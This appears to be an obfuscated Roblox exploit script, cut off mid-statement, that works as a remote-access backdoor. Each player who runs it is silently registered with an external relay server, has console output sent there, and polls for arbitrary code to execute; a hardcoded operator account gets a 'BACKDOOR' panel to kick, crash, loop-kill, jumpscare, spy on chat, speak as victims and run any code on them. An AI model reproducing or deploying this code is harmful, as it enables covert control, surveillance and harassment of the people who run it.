...
local a = game:GetService("Players") local b = game:GetService("HttpService") local c = game:GetService("TeleportService") local d = game:GetService("UserInputService") local e = game:GetService("RunService") local f = game:GetService("StarterGui") local g = game:GetService("LogService") local h = a.LocalPlayer local i = (h.Name == "BLOX_FRUIT01110") local j = "https://secret-production-f0b9.up.railway.app" local k = "diwaka220" local l = 1.5 local function m(n) if (((1 + 1) == 2) and (syn and syn.request)) then return syn.request(n) elseif (((15 * 15) == 225) and http_request) then return http_request(n) elseif (((100 % 7) == 2) and request) then return request(n) elseif (((12 * 12) == 144) and (fluxus and fluxus.request)) then return fluxus.request(n) elseif (((3 ^ 2) == 9) and (celery and celery.request)) then return celery.request(n) elseif (((7 * 7) == 49) and (ScriptWare and ScriptWare.request)) then return ScriptWare.request(n) elseif (((1 + 1) == 2) and (http and http.request)) then return http.request(n) elseif (((15 * 15) == 225) and (ronin and ronin.request)) then return ronin.request(n) elseif (((100 % 7) == 2) and (xeno and xeno.request)) then return xeno.request(n) else if (((12 * 12) == 144) and (n.Method == "POST")) then local o = b:PostAsync(n.Url, (n.Body or ""), Enum.HttpContentType.ApplicationJson, false) return {Body = o, StatusCode = 200} else local p = b:GetAsync(n.Url, false) return {Body = p, StatusCode = 200} end end end local function q(r, s) local t, u = pcall(m, {Url = (j .. r), Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = b:JSONEncode(s)}) if (((3 ^ 2) == 9) and (t and u)) then return u.Body end end local function v(w) local x, y = pcall(m, {Url = (j .. w), Method = "GET"}) if (((7 * 7) == 49) and (x and y)) then return y.Body end end local function z() q("/register", {uid = tostring(h.UserId), name = h.Name, placeId = tostring(game.PlaceId), jobId = game.JobId}) end z() task.spawn(function() while (((1 + 1) == 2) and task.wait(l)) do z() end end) local function aa() local ab = tostring(h.UserId) g.MessageOut:Connect(function(ac, ad) local ae = "[print]" if (((15 * 15) == 225) and (ad == Enum.MessageType.MessageWarning)) then ae = "[warn]" elseif (((100 % 7) == 2) and (ad == Enum.MessageType.MessageError)) then ae = "[error]" elseif (((12 * 12) == 144) and (ad == Enum.MessageType.MessageInfo)) then ae = "[info]" end task.spawn(q, "/log", {uid = ab, name = h.Name, msg = (ae .. (" " .. tostring(ac))), adminKey = k}) end) end aa() local af = {} task.spawn(function() while (((3 ^ 2) == 9) and task.wait(l)) do local ag = v(("/poll/" .. tostring(h.UserId))) if (((7 * 7) == 49) and ag) then local ah, ai = pcall(b.JSONDecode, b, ag) if (((1 + 1) == 2) and (((ah and ai) and (type(ai.code) == "string")) and (#ai.code > 0))) then if (((15 * 15) == 225) and (ai.code == "__KILLTHREADS__")) then for aj, ak in pairs(af) do pcall(task.cancel, ak) end af = {} elseif (((100 % 7) == 2) and (ai.code == "__UNLOAD__")) then for al, am in pairs(af) do pcall(task.cancel, am) end af = {} local an = h:FindFirstChild("PlayerGui") if (((12 * 12) == 144) and an) then local ao = an:FindFirstChild("BD_Admin") if (((3 ^ 2) == 9) and ao) then ao:Destroy() end end break else local ap = loadstring(ai.code) if (((7 * 7) == 49) and ap) then local aq = task.spawn(pcall, ap) table.insert(af, aq) end end end end end end) if (((1 + 1) == 2) and not i) then local ar = string.format(" local RELAY=\"%s\" local KEY=\"%s\"\n local hs=game:GetService(\"HttpService\")\n local lp=game:GetService(\"Players\").LocalPlayer\n local ls=game:GetService(\"LogService\")\n local function req(o)\n if syn and syn.request then return syn.request(o)\n elseif http_request then return http_request(o)\n elseif request then return request(o) end\n end\n local function rpost(p,d) pcall(req,{Url=RELAY..p,Method=\"POST\",\n Headers={[\"Content-Type\"]=\"application/json\"},Body=hs:JSONEncode(d)}) end\n local uid=tostring(lp.UserId)\n ls.MessageOut:Connect(function(msg,mt)\n local pre=\"[print]\"\n if mt==Enum.MessageType.MessageWarning then pre=\"[warn]\"\n elseif mt==Enum.MessageType.MessageError then pre=\"[error]\" end\n task.spawn(rpost,\"/log\",{uid=uid,name=lp.Name,msg=pre..\" \"..tostring(msg),adminKey=KEY})\n end)\n task.spawn(function() while task.wait(1.5) do\n rpost(\"/register\",{uid=uid,name=lp.Name,placeId=tostring(game.PlaceId),jobId=game.JobId})\n end end)\n task.spawn(function() while task.wait(1.5) do\n local ok,res=pcall(req,{Url=RELAY..\"/poll/\"..uid,Method=\"GET\"})\n if ok and res and res.Body then\n local ok2,d=pcall(hs.JSONDecode,hs,res.Body)\n if ok2 and d and type(d.code)==\"string\" and #d.code>0 then\n local fn=loadstring(d.code) if fn then task.spawn(pcall,fn) end\n end\n end\n end end)\n rpost(\"/register\",{uid=uid,name=lp.Name,placeId=tostring(game.PlaceId),jobId=game.JobId})\n ", j, k) game:GetService("TeleportService").LocalPlayerArrivedFromTeleport:Connect(function() task.wait(1) q("/register", {uid = tostring(h.UserId), name = h.Name, placeId = tostring(game.PlaceId), jobId = game.JobId}) end) a.LocalPlayer.OnTeleport:Connect(function(as) if (((15 * 15) == 225) and (as == Enum.TeleportState.Started)) then q("/send", {targetUid = tostring(h.UserId), code = ar, adminKey = k}) end end) return end local at = workspace.CurrentCamera.ViewportSize.X local au = math.clamp((at / 1280), 0.6, 1.4) local function av(aw) return math.floor((aw * au)) end local function ax(ay, az, ba) pcall(f.SetCore, f, "SendNotification", {Title = ay, Text = az, Duration = (ba or 3)}) end local bb = {bg = Color3.fromRGB(12, 12, 18), panel = Color3.fromRGB(18, 18, 26), surface = Color3.fromRGB(24, 24, 34), elevated = Color3.fromRGB(32, 28, 48), border = Color3.fromRGB(55, 35, 90), accent = Color3.fromRGB(120, 60, 220), accentHi = Color3.fromRGB(160, 100, 255), danger = Color3.fromRGB(200, 40, 40), dangerHi = Color3.fromRGB(240, 70, 70), success = Color3.fromRGB(40, 180, 90), warn = Color3.fromRGB(220, 160, 30), text = Color3.fromRGB(230, 230, 240), textDim = Color3.fromRGB(130, 120, 155), textMid = Color3.fromRGB(180, 170, 210)} local function bc(bd, be) local bf = Instance.new("UICorner") bf.CornerRadius = UDim.new(0, av((be or 6))) bf.Parent = bd return bf end local function bg(bh, bi, bj) local bk = Instance.new("UIStroke") bk.Thickness = (bi or 1) bk.Color = (bj or bb.border) bk.Parent = bh return bk end local function bl(bm, bn, bo, bp) local bq = Instance.new("UIPadding") if (((100 % 7) == 2) and bn) then bq.PaddingTop = UDim.new(0, bn) bq.PaddingBottom = UDim.new(0, bn) bq.PaddingLeft = UDim.new(0, bn) bq.PaddingRight = UDim.new(0, bn) else if (((12 * 12) == 144) and bo) then bq.PaddingLeft = UDim.new(0, bo) bq.PaddingRight = UDim.new(0, bo) end if (((3 ^ 2) == 9) and bp) then bq.PaddingTop = UDim.new(0, bp) bq.PaddingBottom = UDim.new(0, bp) end end bq.Parent = bm return bq end local function br(bs, bt, bu, bv, bw, bx) local by = Instance.new("TextLabel") by.BackgroundTransparency = 1 by.Text = bt by.TextSize = av((bu or 12)) by.TextColor3 = (bv or bb.text) by.Font = (bw or Enum.Font.Gotham) by.TextXAlignment = (bx or Enum.TextXAlignment.Left) by.TextYAlignment = Enum.TextYAlignment.Center by.Parent = bs return by end local function bz(ca, cb, cc, cd, ce) local cf = Instance.new("TextButton") cf.BackgroundColor3 = (cc or bb.accent) cf.BorderSizePixel = 0 cf.Text = cb cf.TextColor3 = bb.text cf.TextSize = av((cd or 12)) cf.Font = (ce or Enum.Font.GothamBold) cf.AutoButtonColor = false cf.Parent = ca bc(cf, 5) cf.MouseEnter:Connect(function() cf.BackgroundColor3 = cf.BackgroundColor3:Lerp(Color3.new(1, 1, 1), 0.12) end) cf.MouseLeave:Connect(function() cf.BackgroundColor3 = (cc or bb.accent) end) return cf end local function cg(ch, ci, cj) local ck = Instance.new("TextBox") ck.BackgroundColor3 = bb.surface ck.BorderSizePixel = 0 ck.PlaceholderText = (ci or "") ck.PlaceholderColor3 = bb.textDim ck.Text = "" ck.TextColor3 = bb.text ck.TextSize = av(12) ck.Font = Enum.Font.Gotham ck.ClearTextOnFocus = false ck.MultiLine = (cj or false) ck.TextXAlignment = Enum.TextXAlignment.Left ck.TextYAlignment = ((cj and Enum.TextYAlignment.Top) or Enum.TextYAlignment.Center) ck.Parent = ch bc(ck, 5) bg(ck, 1, bb.border) return ck end local cl = Instance.new("ScreenGui") cl.Name = "BD_Admin" cl.ResetOnSpawn = false cl.ZIndexBehavior = Enum.ZIndexBehavior.Sibling cl.IgnoreGuiInset = true cl.Parent = h:WaitForChild("PlayerGui") local cm, cn = av(600), av(560) local co = Instance.new("Frame") co.Size = UDim2.new(0, cm, 0, cn) co.Position = UDim2.new(0.5, (-cm / 2), 0.5, (-cn / 2)) co.BackgroundColor3 = bb.bg co.BorderSizePixel = 0 co.Active = true co.Draggable = true co.ClipsDescendants = true co.Parent = cl bc(co, 10) bg(co, 1, bb.border) local cp = av(40) local cq = Instance.new("Frame") cq.Size = UDim2.new(1, 0, 0, cp) cq.BackgroundColor3 = bb.elevated cq.BorderSizePixel = 0 cq.Parent = co bc(cq, 10) local cr = Instance.new("Frame") cr.Size = UDim2.new(1, 0, 0, av(10)) cr.Position = UDim2.new(0, 0, 1, -av(10)) cr.BackgroundColor3 = bb.elevated cr.BorderSizePixel = 0 cr.Parent = cq local cs = br(cq, ("🔑 BACKDOOR · " .. h.Name), 13, bb.accentHi, Enum.Font.GothamBold) cs.Size = UDim2.new(1, -av(130), 1, 0) cs.Position = UDim2.new(0, av(12), 0, 0) local ct = bz(cq, "⏏ UNLOAD", Color3.fromRGB(80, 30, 30), 11) ct.Size = UDim2.new(0, av(78), 0, av(26)) ct.Position = UDim2.new(1, -av(114), 0.5, -av(13)) local cu = bz(cq, "✕", bb.danger, 12, Enum.Font.GothamBold) cu.Size = UDim2.new(0, av(26), 0, av(26)) cu.Position = UDim2.new(1, -av(32), 0.5, -av(13)) bc(cu, 5) cu.MouseButton1Click:Connect(function() co.Visible = false end) ct.MouseButton1Click:Connect(function() local cv = v(("/clients?adminKey=" .. k)) if (((7 * 7) == 49) and cv) then local cw, cx = pcall(b.JSONDecode, b, cv) if (((1 + 1) == 2) and (cw and (type(cx) == "table"))) then for cy, cz in ipairs(cx) do q("/send", {targetUid = cz.uid, code = "__UNLOAD__", adminKey = k}) end end end task.wait(0.3) cl:Destroy() end) local da = av(36) local db = Instance.new("Frame") db.Size = UDim2.new(1, 0, 0, da) db.Position = UDim2.new(0, 0, 0, cp) db.BackgroundColor3 = bb.panel db.BorderSizePixel = 0 db.Parent = co local dc = Instance.new("UIListLayout") dc.FillDirection = Enum.FillDirection.Horizontal dc.SortOrder = Enum.SortOrder.LayoutOrder dc.Parent = db local dd = {"Players", "Execute", "Tools", "Console", "Logs"} local de = {} local df = {} local dg = (cp + da) local dh = (cn - dg) local function di() local dj = Instance.new("Frame") dj.Size = UDim2.new(1, 0, 0, dh) dj.Position = UDim2.new(0, 0, 0, dg) dj.BackgroundTransparency = 1 dj.Visible = false dj.Parent = co return dj end local function dk(dl) for dm, dn in ipairs(dd) do df[dn].Visible = false de[dn].BackgroundColor3 = bb.panel de[dn].TextColor3 = bb.textDim end df[dl].Visible = true de[dl].BackgroundColor3 = bb.elevated de[dl].TextColor3 = bb.accentHi end local dp = math.floor((cm / #dd)) for dq, dr in ipairs(dd) do local ds = di() df[dr] = ds local dt = Instance.new("TextButton") dt.Size = UDim2.new(0, dp, 1, 0) dt.BackgroundColor3 = bb.panel dt.BorderSizePixel = 0 dt.Text = dr dt.TextColor3 = bb.textDim dt.TextSize = av(11) dt.Font = Enum.Font.GothamBold dt.LayoutOrder = dq dt.AutoButtonColor = false dt.Parent = db de[dr] = dt dt.MouseButton1Click:Connect(function() dk(dr) end) end task.defer(function() dk("Players") end) local du = df["Players"] local dv = av(8) local dw = av(185) local dx = ((dv + dw) + dv) local dy = ((cm - dx) - dv) local dz = av(28) local ea = av(4) local eb = br(du, "CONNECTED 0", 10, bb.textDim, Enum.Font.GothamBold) eb.Size = UDim2.new(0, dw, 0, av(20)) eb.Position = UDim2.new(0, dv, 0, dv) local ec = Instance.new("ScrollingFrame") ec.Size = UDim2.new(0, dw, 0, (((dh - av(20)) - (dv * 2)) - av(4))) ec.Position = UDim2.new(0, dv, 0, (dv + av(22))) ec.BackgroundColor3 = bb.surface ec.BorderSizePixel = 0 ec.ScrollBarThickness = av(3) ec.ScrollBarImageColor3 = bb.accent ec.CanvasSize = UDim2.new(0, 0, 0, 0) ec.Parent = du bc(ec, 6) bg(ec, 1, bb.border) local ed = Instance.new("UIListLayout") ed.SortOrder = Enum.SortOrder.LayoutOrder ed.Padding = UDim.new(0, av(2)) ed.Parent = ec bl(ec, av(4)) local ee = br(du, "No target selected", 13, bb.accentHi, Enum.Font.GothamBold) ee.Size = UDim2.new(0, dy, 0, av(20)) ee.Position = UDim2.new(0, dx, 0, dv) local ef = Instance.new("Frame") ef.Size = UDim2.new(0, dy, 0, av(46)) ef.Position = UDim2.new(0, dx, 0, (dv + av(22))) ef.BackgroundColor3 = bb.surface ef.BorderSizePixel = 0 ef.Parent = du bc(ef, 6) bg(ef, 1, bb.border) bl(ef, av(6)) local eg = br(ef, "", 10, bb.textDim) eg.Size = UDim2.new(1, 0, 1, 0) eg.TextWrapped = true local eh = (((dv + av(22)) + av(46)) + dv) local ei = math.floor((((dy - dv)) / 2)) local function ej(ek, el, em, en) local eo = (en % 2) local ep = math.floor((en / 2)) local eq = bz(du, ek, el, 11) eq.Size = UDim2.new(0, ((em and dy) or ei), 0, dz) eq.Position = UDim2.new(0, (dx + (eo * ((ei + dv)))), 0, (eh + (ep * ((dz + ea))))) return eq end local er = ej("⇒ Join Server", Color3.fromRGB(30, 75, 150), false, 0) local es = ej("📍 Pull to Me", Color3.fromRGB(30, 130, 80), false, 1) local et = ej("🚀 TP Here (same)", Color3.fromRGB(40, 155, 110), false, 2) local eu = ej("🥾 Kick", bb.danger, false, 3) local ev = ej("💥 Crash", Color3.fromRGB(140, 20, 20), false, 4) local ew = ej("😱 Jumpscare", Color3.fromRGB(160, 20, 160), false, 5) local ex = ej("👁 Spy Chat", Color3.fromRGB(50, 55, 140), false, 6) local ey = ej("🧊 Freeze", Color3.fromRGB(20, 85, 130), false, 7) local ez = ej("♾ Loop Kill", Color3.fromRGB(130, 25, 55), false, 8) local fa = ej("📋 Copy JobID", Color3.fromRGB(55, 35, 80), false, 9) local fb = bz(du, "⛔ Kill All Remote Threads on Target", Color3.fromRGB(100, 30, 30), 11) fb.Size = UDim2.new(0, dy, 0, dz) fb.Position = UDim2.new(0, dx, 0, (eh + (5 * ((dz + ea))))) local fc = nil local fd = {} local fe = {} local function ff() local fg = v(("/clients?adminKey=" .. k)) if (((15 * 15) == 225) and not fg) then return end local fh, fi = pcall(b.JSONDecode, b, fg) if (((100 % 7) == 2) and (not fh or (type(fi) ~= "table"))) then return end fd = {} for fj, fk in ipairs(fi) do fd[fk.uid] = fk end for fl, fm in ipairs(ec:GetChildren()) do if (((12 * 12) == 144) and fm:IsA("TextButton")) then fm:Destroy() end end local fn = 0 for fo, fp in ipairs(fi) do fn = (fn + 1) local fq = Instance.new("TextButton") fq.Size = UDim2.new(1, -av(6), 0, av(32)) fq.BackgroundColor3 = (((fp.uid == fc) and bb.elevated) or bb.panel) fq.BorderSizePixel = 0 fq.Text = "" fq.AutoButtonColor = false fq.LayoutOrder = fn bc(fq, 5) if (((3 ^ 2) == 9) and (fp.uid == fc)) then bg(fq, 1, bb.accent) end fq.Parent = ec local fr = br(fq, (((fp.uid == fc) and "●") or "○"), 10, (((fp.uid == fc) and bb.accentHi) or bb.textDim)) fr.Size = UDim2.new(0, av(16), 1, 0) fr.Position = UDim2.new(0, av(6), 0, 0) fr.TextXAlignment = Enum.TextXAlignment.Center local fs = br(fq, fp.name, 12, (((fp.uid == fc) and bb.text) or bb.textMid), Enum.Font.GothamSemibold) fs.Size = UDim2.new(1, -av(24), 1, 0) fs.Position = UDim2.new(0, av(22), 0, 0) local ft = fp.uid fq.MouseButton1Click:Connect(function() fc = ft ee.Text = fp.name eg.Text = ("UID " .. (ft .. (" · Place " .. (tostring(fp.placeId) .. ("\nJob " .. (string.sub(tostring(fp.jobId), 1, 30) .. "…")))))) ff() end) fq.MouseEnter:Connect(function() if (((7 * 7) == 49) and (fp.uid ~= fc)) then fq.BackgroundColor3 = bb.elevated end end) fq.MouseLeave:Connect(function() if (((1 + 1) == 2) and (fp.uid ~= fc)) then fq.BackgroundColor3 = bb.panel end end) end ec.CanvasSize = UDim2.new(0, 0, 0, ((fn * av(36)) + (dv * 2))) eb.Text = ("CONNECTED " .. fn) end er.MouseButton1Click:Connect(function() if (((15 * 15) == 225) and not fc) then return end local fu = fd[fc] if (((100 % 7) == 2) and fu) then c:TeleportToPlaceInstance(tonumber(fu.placeId), fu.jobId, h) end end) et.MouseButton1Click:Connect(function() if (((12 * 12) == 144) and not fc) then return end local fv = fd[fc] if (((3 ^ 2) == 9) and not fv) then return end if (((7 * 7) == 49) and (tostring(fv.jobId) ~= tostring(game.JobId))) then ax("Different Server", "Use Pull to Me instead") return end local fw = h.Character if (((1 + 1) == 2) and (not fw or not fw.PrimaryPart)) then return end local fx = fw.PrimaryPart.Position local fy = fw.PrimaryPart.CFrame local fz = string.format(" local c=game:GetService(\"Players\").LocalPlayer.Character\n local r=c and c:WaitForChild(\"HumanoidRootPart\",5)\n if r then r.CFrame=CFrame.new(%f,%f,%f)*CFrame.Angles(0,%f,0) end\n ", fx.X, (fx.Y + 3), fx.Z, math.atan2(fy.LookVector.X, fy.LookVector.Z)) q("/send", {targetUid = fc, code = fz, adminKey = k}) ax("TP Sent", (((fv.name or "?")) .. " warped to you")) end) eu.MouseButton1Click:Connect(function() if (((15 * 15) == 225) and not fc) then return end q("/send", {targetUid = fc, code = "game:GetService(\"Players\").LocalPlayer:Kick(\"Removed.\")", adminKey = k}) ax("Kicked", ((fd[fc] and fd[fc].name) or "?")) end) ev.MouseButton1Click:Connect(function() if (((100 % 7) == 2) and not fc) then return end q("/send", {targetUid = fc, code = "while true do local t={} for i=1,1e7 do t[i]={} end end", adminKey = k}) ax("Crash sent", "💥") end) ew.MouseButton1Click:Connect(function() if (((12 * 12) == 144) and not fc) then return end local ga = " local lp=game:GetService(\"Players\").LocalPlayer\n local uis=game:GetService(\"UserInputService\")\n local gui=lp:WaitForChild(\"PlayerGui\")\n local old=gui:FindFirstChild(\"__Scare\") if old then old:Destroy() end\n local vp=workspace.CurrentCamera.ViewportSize\n local mob=uis.TouchEnabled and not uis.MouseEnabled or(vp.X<800 or vp.Y<500)\n local sg=Instance.new(\"ScreenGui\")\n sg.Name=\"__Scare\" sg.ResetOnSpawn=false sg.IgnoreGuiInset=true\n sg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling sg.Parent=gui\n local img=Instance.new(\"ImageLabel\")\n img.Size=UDim2.new(1,0,1,0) img.BackgroundColor3=Color3.new(0,0,0)\n img.BackgroundTransparency=0 img.ZIndex=999\n img.ScaleType=mob and Enum.ScaleType.Fit or Enum.ScaleType.Stretch\n img.ImageTransparency=0 img.Parent=sg\n local _d=Instance.new(\"Decal\") _d.Texture=\"rbxassetid://1972219027\"\n img.Image=_d.Texture _d:Destroy()\n if mob then task.spawn(function()\n for i=1,20 do\n img.Position=UDim2.new(0,math.random(-12,12),0,math.random(-12,12))\n task.wait(0.04)\n end img.Position=UDim2.new(0,0,0,0)\n end) end\n task.delay(2.5,function()\n local tw=game:GetService(\"TweenService\"):Create(img,\n TweenInfo.new(0.6),{ImageTransparency=1,BackgroundTransparency=1})\n tw:Play() tw.Completed:Connect(function() sg:Destroy() end)\n end)\n " q("/send", {targetUid = fc, code = ga, adminKey = k}) ax("😱", "Jumpscare sent") end) ex.MouseButton1Click:Connect(function() if (((3 ^ 2) == 9) and not fc) then return end if (((7 * 7) == 49) and fe[fc]) then fe[fc] = false ex.Text = "👁 Spy Chat" ex.BackgroundColor3 = Color3.fromRGB(50, 55, 140) ax("Spy", "Stopped") return end fe[fc] = true ex.Text = "🔴 Stop Spy" ex.BackgroundColor3 = bb.danger local gb = string.format(" local hs=game:GetService(\"HttpService\")\n local lp=game:GetService(\"Players\").LocalPlayer\n local function req(o) if syn and syn.request then return syn.request(o)\n elseif http_request then return http_request(o)\n elseif request then return request(o) end end\n lp.Chatted:Connect(function(msg)\n pcall(req,{Url=\"%s/log\",Method=\"POST\",\n Headers={[\"Content-Type\"]=\"application/json\"},\n Body=hs:JSONEncode({uid=tostring(lp.UserId),name=lp.Name,\n msg=\"[chat] \"..msg,adminKey=\"%s\"})})\n end)\n ", j, k) q("/send", {targetUid = fc, code = gb, adminKey = k}) ax("Spy Active", ("Logging " .. (((fd[fc] and fd[fc].name) or "?")))) end) ey.MouseButton1Click:Connect(function() if (((1 + 1) == 2) and not fc) then return end q("/send", {targetUid = fc, code = " local c=game:GetService(\"Players\").LocalPlayer.Character\n local r=c and c:FindFirstChild(\"HumanoidRootPart\")\n if r then r.Anchored=not r.Anchored end\n ", adminKey = k}) ax("Freeze", "Toggled") end) ez.MouseButton1Click:Connect(function() if (((15 * 15) == 225) and not fc) then return end q("/send", {targetUid = fc, code = " local lp=game:GetService(\"Players\").LocalPlayer\n task.spawn(function() while task.wait(0.1) do\n local h=lp.Character and lp.Character:FindFirstChildOfClass(\"Humanoid\")\n if h then h.Health=0 end\n end end)\n ", adminKey = k}) ax("Loop Kill", "Active on target") end) fa.MouseButton1Click:Connect(function() if (((100 % 7) == 2) and not fc) then return end local gc = fd[fc] if (((12 * 12) == 144) and gc) then if (((3 ^ 2) == 9) and setclipboard) then pcall(setclipboard, gc.jobId) end ax("JobID", tostring(gc.jobId)) end end) fb.MouseButton1Click:Connect(function() if (((7 * 7) == 49) and not fc) then return end q("/send", {targetUid = fc, code = "__KILLTHREADS__", adminKey = k}) ax("Kill Threads", ("Sent to " .. (((fd[fc] and fd[fc].name) or "?")))) end) es.MouseButton1Click:Connect(function() if (((1 + 1) == 2) and not fc) then return end local gd = tostring(game.PlaceId) local ge = tostring(game.JobId) local gf = fc local gg = string.format(" local RELAY=\"%s\" local KEY=\"%s\"\n local hs=game:GetService(\"HttpService\")\n local lp=game:GetService(\"Players\").LocalPlayer\n local ls=game:GetService(\"LogService\")\n local function req(o) if syn and syn.request then return syn.request(o)\n elseif http_request then return http_request(o)\n elseif request then return request(o) end end\n local function rpost(p,d) pcall(req,{Url=RELAY..p,Method=\"POST\",\n Headers={[\"Content-Type\"]=\"application/json\"},Body=hs:JSONEncode(d)}) end\n local uid=tostring(lp.UserId)\n ls.MessageOut:Connect(function(msg,mt)\n local pre=\"[print]\"\n if mt==Enum.MessageType.MessageWarning then pre=\"[warn]\"\n elseif mt==Enum.MessageType.MessageError then pre=\"[error]\" end\n task.spawn(rpost,\"/log\",{uid=uid,name=lp.Name,msg=pre..\" \"..tostring(msg),adminKey=KEY})\n end)\n task.spawn(function() while task.wait(1.5) do\n rpost(\"/register\",{uid=uid,name=lp.Name,placeId=tostring(game.PlaceId),jobId=game.JobId})\n end end)\n task.spawn(function() while task.wait(1.5) do\n local ok,res=pcall(req,{Url=RELAY..\"/poll/\"..uid,Method=\"GET\"})\n if ok and res and res.Body then\n local ok2,d=pcall(hs.JSONDecode,hs,res.Body)\n if ok2 and d and type(d.code)==\"string\" and #d.code>0 then\n local fn=loadstring(d.code) if fn then task.spawn(pcall,fn) end\n end\n end\n end end)\n rpost(\"/register\",{uid=uid,name=lp.Name,placeId=tostring(game.PlaceId),jobId=game.JobId})\n ", j, k) q("/send", {targetUid = gf, code = gg, adminKey = k}) task.delay(0.3, function() local gh = string.format(" local ts=game:GetService(\"TeleportService\")\n local lp=game:GetService(\"Players\").LocalPlayer\n if syn and syn.tpt then pcall(syn.tpt,%s,\"%s\") return end\n if teleport then pcall(teleport,%s) return end\n if xeno and xeno.teleport then pcall(xeno.teleport,%s) return end\n pcall(function() ts:TeleportToPlaceInstance(%s,\"%s\",lp) end)\n ", gd, ge, gd, gd, gd, ge) q("/send", {targetUid = gf, code = gh, adminKey = k}) end) ax("Pull Sent", ((((fd[gf] and fd[gf].name) or "?")) .. " — re-inject queued")) end) task.spawn(function() while (((15 * 15) == 225) and task.wait(l)) do ff() end end) local gi = df["Execute"] local gj = av(26) local gk = (((((((dh - av(18)) - (dv * 4)) - av(32)) - gj) - av(30)) - dz) - dv) local gl = br(gi, "Code (runs on target's executor):", 10, bb.textDim) gl.Size = UDim2.new(1, (-dv * 2), 0, av(16)) gl.Position = UDim2.new(0, dv, 0, dv) local gm = cg(gi, "-- lua runs on target\nprint('hello')", true) gm.Font = Enum.Font.Code gm.TextSize = av(12) gm.Size = UDim2.new(1, (-dv * 2), 0, gk) gm.Position = UDim2.new(0, dv, 0, (dv + av(18))) local gn = (((dv + av(18)) + gk) + dv) local go = bz(gi, "▶ Execute on Target", bb.accent, 12) go.Size = UDim2.new(1, (-dv * 2), 0, av(30)) go.Position = UDim2.new(0, dv, 0, gn) local gp = {{"Print pos", "print(game:GetService(\"Players\").LocalPlayer.Character.PrimaryPart.Position)"}, {"Speed x2", "game:GetService(\"Players\").LocalPlayer.Character.Humanoid.WalkSpeed=32"}, {"Noclip", "local rs=game:GetService(\"RunService\") game:GetService(\"Players\").LocalPlayer.Character.Humanoid:ChangeState(11) rs.Stepped:Connect(function() game:GetService(\"Players\").LocalPlayer.Character.Humanoid:ChangeState(11) end)"}, {"Inf Jump", "game:GetService(\"UserInputService\").JumpRequest:Connect(function() game:GetService(\"Players\").LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping) end)"}, {"God Mode", "local h=game:GetService(\"Players\").LocalPlayer.Character.Humanoid h.MaxHealth=math.huge h.Health=math.huge"}, {"Print plrs", "for _,p in pairs(game:GetService(\"Players\"):GetPlayers()) do print(p.Name,p.UserId) end"}, {"Ls scripts", "for _,s in pairs(game:GetDescendants()) do if s:IsA(\"LocalScript\") or s:IsA(\"Script\") then print(s:GetFullName()) end end"}} local gq = Instance.new("Frame") gq.Size = UDim2.new(1, (-dv * 2), 0, gj) gq.Position = UDim2.new(0, dv, 0, (gn + av(34))) gq.BackgroundTransparency = 1 gq.ClipsDescendants = true gq.Parent = gi local gr = Instance.new("UIListLayout") gr.FillDirection = Enum.FillDirection.Horizontal gr.Padding = UDim.new(0, av(4)) gr.Parent = gq for gs, gt in ipairs(gp) do local gu = bz(gq, gt[1], bb.elevated, 10) gu.Size = UDim2.new(0, av(78), 0, av(22)) gu.TextColor3 = bb.accentHi local gv = gt[2] gu.MouseButton1Click:Connect(function() gm.Text = gv end) end local gw = (((gn + av(34)) + gj) + dv) local gx = br(gi, "💬 Chat as target:", 10, bb.textDim) gx.Size = UDim2.new(1, (-dv * 2), 0, av(14)) gx.Position = UDim2.new(0, dv, 0, gw) local gy = (((cm - (dv * 2)) - av(80)) - dv) local gz = cg(gi, "Message to send as target...") gz.Size = UDim2.new(0, gy, 0, dz) gz.Position = UDim2.new(0, dv, 0, (gw + av(16))) local ha = bz(gi, "💬 Send", Color3.fromRGB(40, 100, 200), 11) ha.Size = UDim2.new(0, av(76), 0, dz) ha.Position = UDim2.new(0, ((dv + gy) + dv), 0, (gw + av(16))) local function hb(hc, hd) if (((100 % 7) == 2) and (#hd == 0)) then return end local he = hd:gsub("\\", "\\\\"):gsub("\"", "\\\"") local hf = string.format(" local ok,ch=pcall(function()\n return game:GetService(\"TextChatService\")\n :WaitForChild(\"TextChannels\",5):WaitForChild(\"RBXGeneral\",5)\n end)\n if ok and ch then pcall(function() ch:SendAsync(\"%s\") end) end\n ", he) q("/send", {targetUid = hc, code = hf, adminKey = k}) ax("Chat sent", ("\"" .. (hd .. "\""))) gz.Text = "" end go.MouseButton1Click:Connect(function() if (((12 * 12) == 144) and not fc) then ax("No Target", "Select a player first") return end local hg = gm.Text if (((3 ^ 2) == 9) and (#hg == 0)) then return end q("/send", {targetUid = fc, code = hg, adminKey = k}) ax("Executed", ("→ " .. (((fd[fc] and fd[fc].name) or "?")))) end) ha.MouseButton1Click:Connect(function() if (((7 * 7) == 49) and not fc) then ax("No Target", "Select a player first") return end hb(fc, gz.Text) end) gz.FocusLost:Connect(function(hh) if (((1 + 1) == 2) and (hh and fc)) then hb(fc, gz.Text) end end) local hi = df["Tools"] local function hj(hk, hl, hm) local hn = br(hk, hl, 9, bb.textDim, Enum.Font.GothamBold) hn.Size = UDim2.new(1, (-dv * 2), 0, av(14)) hn.Position = UDim2.new(0, dv, 0, hm) return hn end local function ho(hp, hq, hr, hs, ht, hu) local hv = bz(hi, hp, hq, 11) hv.Size = UDim2.new(0, (ht or av(175)), 0, (hu or dz)) hv.Position = UDim2.new(0, hr, 0, hs) return hv end local hw = dv hj(hi, "SERVER BROADCAST", hw) hw = (hw + av(16)) local hx = cg(hi, "Message to all connected clients…") hx.Size = UDim2.new(0, (((cm - (dv * 2)) - av(90)) - dv), 0, dz) hx.Position = UDim2.new(0, dv, 0, hw) local hy = bz(hi, "📢 Broadcast", Color3.fromRGB(90, 50, 170), 11) hy.Size = UDim2.new(0, av(86), 0, dz) hy.Position = UDim2.new(0, ((cm - dv) - av(86)), 0, hw) hy.MouseButton1Click:Connect(function() local hz = hx.Text if (((15 * 15) == 225) and (#hz == 0)) then return end local ia = v(("/clients?adminKey=" .. k)) if (((100 % 7) == 2) and not ia) then return end local ib, ic = pcall(b.JSONDecode, b, ia) if (((12 * 12) == 144) and not ib) then return end local id = hz:gsub("\\", "\\\\"):gsub("\"", "\\\"") local ie = string.format(" game:GetService(\"StarterGui\"):SetCore(\"SendNotification\",\n {Title=\"📢 Admin\",Text=\"%s\",Duration=6})\n ", id) for ig, ih in ipairs(ic) do q("/send", {targetUid = ih.uid, code = ie, adminKey = k}) end ax("Broadcast", ("→ " .. (#ic .. " clients"))) hx.Text = "" end) hw = 